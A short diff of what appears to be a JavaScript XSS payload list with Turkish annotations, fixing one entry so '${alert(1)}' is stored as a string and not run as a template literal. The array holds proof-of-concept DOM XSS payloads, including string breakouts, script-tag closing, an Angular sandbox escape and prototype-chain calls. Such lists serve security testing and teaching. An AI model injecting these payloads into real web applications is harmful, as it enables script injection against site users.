@@ -82,7 +82,7 @@ const domPayloads = [
   { code: `'-alert(1)-'`, note: "JS string içinde" },
   { code: `\\'-alert(1)//`, note: "Escape bypass" },
   { code: `</script><script>alert(1)</script>`, note: "Script tag kapatma" },
-  { code: `${alert(1)}`, note: "Template literal" },
+  { code: "${alert(1)}", note: "Template literal" },
   { code: `{{constructor.constructor('alert(1)')()}}`, note: "Angular sandbox escape" },
   { code: `[].constructor.constructor('alert(1)')()`, note: "Prototype chain" },
   { code: `window['alert'](1)`, note: "Bracket notation" },
